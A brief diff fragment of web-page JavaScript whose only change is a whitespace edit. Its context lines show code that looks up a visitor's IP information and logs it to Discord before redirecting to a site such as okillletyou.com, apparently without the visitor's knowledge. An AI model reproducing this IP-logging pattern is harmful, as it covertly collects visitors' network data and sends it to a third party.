@@ -172,7 +172,7 @@
         // Get and log IP info before redirecting
         const ipData = await getIPInfo();
         await logToDiscord(ipData);
-
+        
         if (input === "y") {
           window.location.href = "https://okillletyou.com";
         } else if (input === "n") {
